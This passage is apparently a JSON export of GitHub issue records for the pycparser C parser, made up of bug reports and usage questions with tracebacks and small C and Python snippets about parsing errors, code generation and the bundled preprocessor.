parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"pycparser/c_parser.py\", line 1847, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: :1:11: before: const\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/312", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/312/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/312/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/312/events", "html_url": "https://github.com/eliben/pycparser/issues/312", "id": 424435132, "node_id": "MDU6SXNzdWU0MjQ0MzUxMzI=", "number": 312, "title": "Generating array type", "user": {"login": "amirgon", "id": 11742638, "node_id": "MDQ6VXNlcjExNzQyNjM4", "avatar_url": "https://avatars2.githubusercontent.com/u/11742638?v=4", "gravatar_id": "", "url": "https://api.github.com/users/amirgon", "html_url": "https://github.com/amirgon", "followers_url": "https://api.github.com/users/amirgon/followers", "following_url": "https://api.github.com/users/amirgon/following{/other_user}", "gists_url": "https://api.github.com/users/amirgon/gists{/gist_id}", "starred_url": "https://api.github.com/users/amirgon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/amirgon/subscriptions", "organizations_url": "https://api.github.com/users/amirgon/orgs", "repos_url": "https://api.github.com/users/amirgon/repos", "events_url": "https://api.github.com/users/amirgon/events{/privacy}", "received_events_url": "https://api.github.com/users/amirgon/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-03-22T23:35:19Z", "updated_at": "2019-03-26T13:42:43Z", "closed_at": "2019-03-26T13:42:43Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Consider the following:\r\n\r\n```python\r\nfrom pycparser import c_parser, c_ast, c_generator\r\nparser = c_parser.CParser()\r\ngen = c_generator.CGenerator()\r\n\r\nast = parser.parse(\"int x[17];\")\r\ngen.visit(ast.ext[0])\r\ngen.visit(ast.ext[0].type)\r\n```\r\n\r\nNow, `gen.visit(ast.ext[0])` returns the expected result: `'int x[17]'`.\r\n**However, `gen.visit(ast.ext[0].type)` returns: `'int17'`**\r\n\r\nI would expect `gen.visit(ast.ext[0].type)` to return `'int[17]'`.  \r\nReturning `'int17'` (the concatenation of `'int'` and `'17'`) just doesn't make sense.  \r\n\r\nTrying to figure this out, I looked for `dim` on `c_generator.py` but the [only place it appears](https://github.com/eliben/pycparser/blob/992715f12aef69eb1351308f14fb5f1ff972ce57/pycparser/c_generator.py#L385) handles the concatenation of the square brackets as well, so I'm not sure where the `int17` could come from.\r\n\r\nAny idea?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/311", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/311/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/311/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/311/events", "html_url": "https://github.com/eliben/pycparser/issues/311", "id": 421420844, "node_id": "MDU6SXNzdWU0MjE0MjA4NDQ=", "number": 311, "title": "How to extracting  all doc comments from c using pycparser?", "user": {"login": "haitaodd", "id": 46930826, "node_id": "MDQ6VXNlcjQ2OTMwODI2", "avatar_url": "https://avatars3.githubusercontent.com/u/46930826?v=4", "gravatar_id": "", "url": "https://api.github.com/users/haitaodd", "html_url": "https://github.com/haitaodd", "followers_url": "https://api.github.com/users/haitaodd/followers", "following_url": "https://api.github.com/users/haitaodd/following{/other_user}", "gists_url": "https://api.github.com/users/haitaodd/gists{/gist_id}", "starred_url": "https://api.github.com/users/haitaodd/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/haitaodd/subscriptions", "organizations_url": "https://api.github.com/users/haitaodd/orgs", "repos_url": "https://api.github.com/users/haitaodd/repos", "events_url": "https://api.github.com/users/haitaodd/events{/privacy}", "received_events_url": "https://api.github.com/users/haitaodd/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-03-15T09:14:39Z", "updated_at": "2019-03-15T14:13:29Z", "closed_at": "2019-03-15T14:13:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "a easy way of  finding comments in source code  is  to use **Regular Expressions**.\r\nbut  does pycparser provide  api  for finding doc  comments?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/308", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/308/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/308/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/308/events", "html_url": "https://github.com/eliben/pycparser/issues/308", "id": 410738822, "node_id": "MDU6SXNzdWU0MTA3Mzg4MjI=", "number": 308, "title": "get NoneType error in FuncCall visitor example with calling a function without given arguments", "user": {"login": "dyhe83", "id": 32974708, "node_id": "MDQ6VXNlcjMyOTc0NzA4", "avatar_url": "https://avatars3.githubusercontent.com/u/32974708?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dyhe83", "html_url": "https://github.com/dyhe83", "followers_url": "https://api.github.com/users/dyhe83/followers", "following_url": "https://api.github.com/users/dyhe83/following{/other_user}", "gists_url": "https://api.github.com/users/dyhe83/gists{/gist_id}", "starred_url": "https://api.github.com/users/dyhe83/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dyhe83/subscriptions", "organizations_url": "https://api.github.com/users/dyhe83/orgs", "repos_url": "https://api.github.com/users/dyhe83/repos", "events_url": "https://api.github.com/users/dyhe83/events{/privacy}", "received_events_url": "https://api.github.com/users/dyhe83/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-02-15T12:03:10Z", "updated_at": "2019-02-15T17:23:49Z", "closed_at": "2019-02-15T14:41:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nI'm trying [example/func_calls](https://github.com/eliben/pycparser/blob/master/examples/func_calls.py) to visit AST, but get some error in the follow program.\r\n```C\r\nint f1(int) {}\r\nint f2() {}\r\nvoid f3(void) {}\r\nvoid f4() {}\r\n\r\nint main(void) {\r\n\tint n = 3;\r\n\tf1(n);\r\n\tf2();\r\n\t// f3();\r\n\t// f4();\r\n\treturn 0;\r\n}\r\n```\r\nThis example works fine when only call `f1(n)`, but it crashed when calling `f2`, `f3` or `f4`.\r\nThe Error Message show as follow:\r\n\r\n```sh\r\npycparser/examples$ python3 func_calls.py c_files/test.c f\r\nTraceback (most recent call last):\r\n  File \"func_calls.py\", line 46, in <module>\r\n    show_func_calls(filename, func)\r\n  File \"func_calls.py\", line 35, in show_func_calls\r\n    v.visit(ast)\r\n  File \"../pycparser/c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"../pycparser/c_ast.py\", line 165, in generic_visit\r\n    self.visit(c)\r\n  File \"../pycparser/c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"../pycparser/c_ast.py\", line 165, in generic_visit\r\n    self.visit(c)\r\n  File \"../pycparser/c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"../pycparser/c_ast.py\", line 165, in generic_visit\r\n    self.visit(c)\r\n  File \"../pycparser/c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"func_calls.py\", line 29, in visit_FuncCall\r\n    self.visit(node.args)\r\n  File \"../pycparser/c_ast.py\", line 158, in visit\r\n    return visitor(node)\r\n  File \"../pycparser/c_ast.py\", line 164, in generic_visit\r\n    for c in node:\r\nTypeError: 'NoneType' object is not iterable\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/307", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/307/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/307/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/307/events", "html_url": "https://github.com/eliben/pycparser/issues/307", "id": 409812338, "node_id": "MDU6SXNzdWU0MDk4MTIzMzg=", "number": 307, "title": "version 2.19 fails to parse empty structs", "user": {"login": "Rahim16", "id": 1232673, "node_id": "MDQ6VXNlcjEyMzI2NzM=", "avatar_url": "https://avatars0.githubusercontent.com/u/1232673?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Rahim16", "html_url": "https://github.com/Rahim16", "followers_url": "https://api.github.com/users/Rahim16/followers", "following_url": "https://api.github.com/users/Rahim16/following{/other_user}", "gists_url": "https://api.github.com/users/Rahim16/gists{/gist_id}", "starred_url": "https://api.github.com/users/Rahim16/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Rahim16/subscriptions", "organizations_url": "https://api.github.com/users/Rahim16/orgs", "repos_url": "https://api.github.com/users/Rahim16/repos", "events_url": "https://api.github.com/users/Rahim16/events{/privacy}", "received_events_url": "https://api.github.com/users/Rahim16/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-02-13T13:45:37Z", "updated_at": "2019-02-13T13:50:47Z", "closed_at": "2019-02-13T13:50:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "Still cannot parse empty structs in version 2.19, python 2.7. Running this code:\r\n```\r\na = \"\"\"\r\nstruct ngram_funcs_s \r\n{\r\n}\r\n;\r\n\"\"\"\r\nfrom pycparser import c_parser\r\nparser = c_parser.CParser()\r\nparser.parse(a)\r\n```\r\nresults in:\r\n```\r\npycparser.plyparser.ParseError: :4:1: before: }\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/306", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/306/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/306/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/306/events", "html_url": "https://github.com/eliben/pycparser/issues/306", "id": 408490867, "node_id": "MDU6SXNzdWU0MDg0OTA4Njc=", "number": 306, "title": "I have the same issue exactly,", "user": {"login": "aishaaldosery", "id": 45576021, "node_id": "MDQ6VXNlcjQ1NTc2MDIx", "avatar_url": "https://avatars0.githubusercontent.com/u/45576021?v=4", "gravatar_id": "", "url": "https://api.github.com/users/aishaaldosery", "html_url": "https://github.com/aishaaldosery", "followers_url": "https://api.github.com/users/aishaaldosery/followers", "following_url": "https://api.github.com/users/aishaaldosery/following{/other_user}", "gists_url": "https://api.github.com/users/aishaaldosery/gists{/gist_id}", "starred_url": "https://api.github.com/users/aishaaldosery/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/aishaaldosery/subscriptions", "organizations_url": "https://api.github.com/users/aishaaldosery/orgs", "repos_url": "https://api.github.com/users/aishaaldosery/repos", "events_url": "https://api.github.com/users/aishaaldosery/events{/privacy}", "received_events_url": "https://api.github.com/users/aishaaldosery/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-02-10T01:46:47Z", "updated_at": "2019-02-11T13:55:43Z", "closed_at": "2019-02-11T13:55:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have the same issue exactly, \r\n\r\nast = parse_file(filename, use_cpp=True,\r\n                     cpp_path='clang', \r\n                     cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n\r\nand the parse_file function looks exactly as you post (I didn't change anything ), I use gcc -E for preprocess\r\n\r\n_Originally posted by @Aishaaldosery in https://github.com/eliben/pycparser/issues/252#issuecomment-462096066_", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/305", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/305/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/305/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/305/events", "html_url": "https://github.com/eliben/pycparser/issues/305", "id": 403821749, "node_id": "MDU6SXNzdWU0MDM4MjE3NDk=", "number": 305, "title": "pycparser 2.18+ break pygit2", "user": {"login": "ignatenkobrain", "id": 2866862, "node_id": "MDQ6VXNlcjI4NjY4NjI=", "avatar_url": "https://avatars1.githubusercontent.com/u/2866862?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ignatenkobrain", "html_url": "https://github.com/ignatenkobrain", "followers_url": "https://api.github.com/users/ignatenkobrain/followers", "following_url": "https://api.github.com/users/ignatenkobrain/following{/other_user}", "gists_url": "https://api.github.com/users/ignatenkobrain/gists{/gist_id}", "starred_url": "https://api.github.com/users/ignatenkobrain/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ignatenkobrain/subscriptions", "organizations_url": "https://api.github.com/users/ignatenkobrain/orgs", "repos_url": "https://api.github.com/users/ignatenkobrain/repos", "events_url": "https://api.github.com/users/ignatenkobrain/events{/privacy}", "received_events_url": "https://api.github.com/users/ignatenkobrain/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 13, "created_at": "2019-01-28T13:45:42Z", "updated_at": "2019-04-13T08:10:16Z", "closed_at": "2019-04-08T13:03:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\n____________________ ERROR collecting test/test_archive.py _____________________\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:174: in _typeof\r\n    result = self._parsed_types[cdecl]\r\nE   KeyError: 'int (*git_transport_certificate_check_cb)(git_cert *cert, int valid, const char *host, void *payload)'\r\nDuring handling of the above exception, another exception occurred:\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:276: in _parse\r\n    ast = _get_parser().parse(fullcsource)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/c_parser.py:152: in parse\r\n    debug=debuglevel)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:331: in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:1199: in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/ply/yacc.py:193: in call_errorfunc\r\n    r = errorfunc(token)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/c_parser.py:1848: in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/pycparser/plyparser.py:67: in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\nE   pycparser.plyparser.ParseError: <cdef source string>:2:7: before: git_transport_certificate_check_cb\r\nDuring handling of the above exception, another exception occurred:\r\ntest/test_archive.py:36: in <module>\r\n    from pygit2 import Index, Oid, Tree, Object\r\npygit2/__init__.py:41: in <module>\r\n    from .remote import Remote, RemoteCallbacks, get_credentials\r\npygit2/remote.py:73: in <module>\r\n    class RemoteCallbacks(object):\r\npygit2/remote.py:315: in RemoteCallbacks\r\n    @ffi.callback('int (*git_transport_certificate_check_cb)'\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:382: in callback\r\n    cdecl = self._typeof(cdecl, consider_function_as_funcptr=True)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:177: in _typeof\r\n    result = self._typeof_locked(cdecl)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/api.py:162: in _typeof_locked\r\n    type = self._parser.parse_type(cdecl)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:476: in parse_type\r\n    return self.parse_type_and_quals(cdecl)[0]\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:479: in parse_type_and_quals\r\n    ast, macros = self._parse('void __dummy(\\n%s\\n);' % cdecl)[:2]\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:278: in _parse\r\n    self.convert_pycparser_error(e, csource)\r\n../../../virtualenv/python3.4.6/lib/python3.4/site-packages/cffi/cparser.py:307: in convert_pycparser_error\r\n    raise CDefError(msg)\r\nE   cffi.error.CDefError: cannot parse \"int (*git_transport_certificate_check_cb)(git_cert *cert, int valid, const char *host, void *payload)\"\r\nE   <cdef source string>:2:7: before: git_transport_certificate_check_cb\r\n```\r\n\r\nI'm pretty sure somebody did report a bug, but I can't find it..", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/304", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/304/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/304/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/304/events", "html_url": "https://github.com/eliben/pycparser/issues/304", "id": 397395732, "node_id": "MDU6SXNzdWUzOTczOTU3MzI=", "number": 304, "title": "Declaration of several variables at once does not generate a DeclList ", "user": {"login": "eduble", "id": 1379641, "node_id": "MDQ6VXNlcjEzNzk2NDE=", "avatar_url": "https://avatars2.githubusercontent.com/u/1379641?v=4", "gravatar_id": "", "url": "https://api.github.com/users/eduble", "html_url": "https://github.com/eduble", "followers_url": "https://api.github.com/users/eduble/followers", "following_url": "https://api.github.com/users/eduble/following{/other_user}", "gists_url": "https://api.github.com/users/eduble/gists{/gist_id}", "starred_url": "https://api.github.com/users/eduble/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/eduble/subscriptions", "organizations_url": "https://api.github.com/users/eduble/orgs", "repos_url": "https://api.github.com/users/eduble/repos", "events_url": "https://api.github.com/users/eduble/events{/privacy}", "received_events_url": "https://api.github.com/users/eduble/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-01-09T14:29:30Z", "updated_at": "2019-01-10T18:57:00Z", "closed_at": "2019-01-10T11:33:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "Code such as `int a, b;` is apparently parsed the same as `int a; int b;`. This is semantically equivalent, but annoying for some uses.\r\nFor example, with code such as:\r\n```\r\nstruct { int f; float g; } a, b;\r\n```\r\nDuplicating the type already appears more problematic.\r\n\r\nBy reading the code of c_generator, I noticed there was a code for handling this kind of declaration list, with  [fonction `visit_DeclList()`](https://github.com/eliben/pycparser/blob/master/pycparser/c_generator.py#L108). But I cannot manage to get it called. Is there something I miss somewhere?\r\n\r\n\r\nSteps to reproduce:\r\n```\r\n>>> from pycparser import c_parser\r\n>>> parser = c_parser.CParser()\r\n>>> parser.parse('int a, b;')\r\nFileAST(ext=[Decl(name='a',\r\n                  quals=[\r\n                        ],\r\n                  storage=[\r\n                          ],\r\n                  funcspec=[\r\n                           ],\r\n                  type=TypeDecl(declname='a',\r\n                                quals=[\r\n                                      ],\r\n                                type=IdentifierType(names=['int'\r\n                                                          ]\r\n                                                    )\r\n                                ),\r\n                  init=None,\r\n                  bitsize=None\r\n                  ),\r\n             Decl(name='b',\r\n                  quals=[\r\n                        ],\r\n                  storage=[\r\n                          ],\r\n                  funcspec=[\r\n                           ],\r\n                  type=TypeDecl(declname='b',\r\n                                quals=[\r\n                                      ],\r\n                                type=IdentifierType(names=['int'\r\n                                                          ]\r\n                                                    )\r\n                                ),\r\n                  init=None,\r\n                  bitsize=None\r\n                  )\r\n            ]\r\n        )\r\n>>>\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/303", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/303/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/303/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/303/events", "html_url": "https://github.com/eliben/pycparser/issues/303", "id": 395894540, "node_id": "MDU6SXNzdWUzOTU4OTQ1NDA=", "number": 303, "title": "Get list of operands and operators?", "user": {"login": "RandomChocolateGenerator", "id": 38988563, "node_id": "MDQ6VXNlcjM4OTg4NTYz", "avatar_url": "https://avatars0.githubusercontent.com/u/38988563?v=4", "gravatar_id": "", "url": "https://api.github.com/users/RandomChocolateGenerator", "html_url": "https://github.com/RandomChocolateGenerator", "followers_url": "https://api.github.com/users/RandomChocolateGenerator/followers", "following_url": "https://api.github.com/users/RandomChocolateGenerator/following{/other_user}", "gists_url": "https://api.github.com/users/RandomChocolateGenerator/gists{/gist_id}", "starred_url": "https://api.github.com/users/RandomChocolateGenerator/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/RandomChocolateGenerator/subscriptions", "organizations_url": "https://api.github.com/users/RandomChocolateGenerator/orgs", "repos_url": "https://api.github.com/users/RandomChocolateGenerator/repos", "events_url": "https://api.github.com/users/RandomChocolateGenerator/events{/privacy}", "received_events_url": "https://api.github.com/users/RandomChocolateGenerator/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-01-04T11:29:45Z", "updated_at": "2019-01-10T11:21:10Z", "closed_at": "2019-01-10T11:21:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello, is it possible to get list of operands and operators from AST tree? If there is no method, how should I analyze the tree to get them?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/302", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/302/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/302/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/302/events", "html_url": "https://github.com/eliben/pycparser/issues/302", "id": 394531289, "node_id": "MDU6SXNzdWUzOTQ1MzEyODk=", "number": 302, "title": "Why `using_gcc_E_libc.py` does not work outside the source tree?", "user": {"login": "pengyu", "id": 1018252, "node_id": "MDQ6VXNlcjEwMTgyNTI=", "avatar_url": "https://avatars3.githubusercontent.com/u/1018252?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pengyu", "html_url": "https://github.com/pengyu", "followers_url": "https://api.github.com/users/pengyu/followers", "following_url": "https://api.github.com/users/pengyu/following{/other_user}", "gists_url": "https://api.github.com/users/pengyu/gists{/gist_id}", "starred_url": "https://api.github.com/users/pengyu/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pengyu/subscriptions", "organizations_url": "https://api.github.com/users/pengyu/orgs", "repos_url": "https://api.github.com/users/pengyu/repos", "events_url": "https://api.github.com/users/pengyu/events{/privacy}", "received_events_url": "https://api.github.com/users/pengyu/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-12-28T02:37:25Z", "updated_at": "2018-12-29T03:19:43Z", "closed_at": "2018-12-29T03:19:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "`using_gcc_E_libc.py` works fine in `/tmp/pycparser/` source directory. But when I move it out, it does not work anymore. I tried to install pycparser from the source code. But it does not work. Does anybody know what is wrong?\r\n\r\n```\r\n/tmp/pycparser$ python setup.py install\r\nrunning install\r\nrunning build\r\nrunning build_py\r\nrunning install_lib\r\nrunning install_egg_info\r\nrunning egg_info\r\nwriting pycparser.egg-info/PKG-INFO\r\nwriting top-level names to pycparser.egg-info/top_level.txt\r\nwriting dependency_links to pycparser.egg-info/dependency_links.txt\r\nreading manifest file 'pycparser.egg-info/SOURCES.txt'\r\nreading manifest template 'MANIFEST.in'\r\nwarning: no previously-included files found matching 'setup.pyc'\r\nwarning: no previously-included files matching 'yacctab.*' found under directory 'tests'\r\nwarning: no previously-included files matching 'lextab.*' found under directory 'tests'\r\nwarning: no previously-included files matching 'yacctab.*' found under directory 'examples'\r\nwarning: no previously-included files matching 'lextab.*' found under directory 'examples'\r\nwriting manifest file 'pycparser.egg-info/SOURCES.txt'\r\nremoving '/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser-2.19-py2.7.egg-info' (and everything under it)\r\nCopying pycparser.egg-info to /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser-2.19-py2.7.egg-info\r\nrunning install_scripts\r\nBuild the lexing/parsing tables\r\n\r\n/tmp$ python using_gcc_E_libc.py year.c \r\nTraceback (most recent call last):\r\n  File \"using_gcc_E_libc.py\", line 29, in <module>\r\n    cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/__init__.py\", line 90, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/c_parser.py\", line 1848, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: /usr/include/i386/_types.h:98:27: before: __darwin_va_list\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/300", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/300/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/300/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/300/events", "html_url": "https://github.com/eliben/pycparser/issues/300", "id": 394109566, "node_id": "MDU6SXNzdWUzOTQxMDk1NjY=", "number": 300, "title": "Included ply CPP preprocessor does not read files with non-ascii characters", "user": {"login": "rreilink", "id": 8604178, "node_id": "MDQ6VXNlcjg2MDQxNzg=", "avatar_url": "https://avatars2.githubusercontent.com/u/8604178?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rreilink", "html_url": "https://github.com/rreilink", "followers_url": "https://api.github.com/users/rreilink/followers", "following_url": "https://api.github.com/users/rreilink/following{/other_user}", "gists_url": "https://api.github.com/users/rreilink/gists{/gist_id}", "starred_url": "https://api.github.com/users/rreilink/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rreilink/subscriptions", "organizations_url": "https://api.github.com/users/rreilink/orgs", "repos_url": "https://api.github.com/users/rreilink/repos", "events_url": "https://api.github.com/users/rreilink/events{/privacy}", "received_events_url": "https://api.github.com/users/rreilink/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-12-26T08:06:04Z", "updated_at": "2018-12-28T02:04:11Z", "closed_at": "2018-12-28T02:04:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "In pycparser.ply.cpp.Preprocessor.include, files are opened as text using unspecified encoding, which result in using `locale.getpreferredencoding(False)`. Using a locale-dependent setting to parse source code is not a good thing. I think a safe default would be to use utf-8 with surrogate escape error handling, which allows all encodings to be decoded without data loss. GCC also uses utf-8 by default.\r\n\r\nTo provide more flexibility for the user, the reading of the included file could be done in a separate method, allowing the user of the class to override this specific part in a derived class (e.g. to substitute constant text for system include files)\r\n\r\nI will prepare a PR.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/299", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/299/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/299/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/299/events", "html_url": "https://github.com/eliben/pycparser/issues/299", "id": 394108164, "node_id": "MDU6SXNzdWUzOTQxMDgxNjQ=", "number": 299, "title": "Included ply CPP preprocessor does not handle #if a != b correctly ", "user": {"login": "rreilink", "id": 8604178, "node_id": "MDQ6VXNlcjg2MDQxNzg=", "avatar_url": 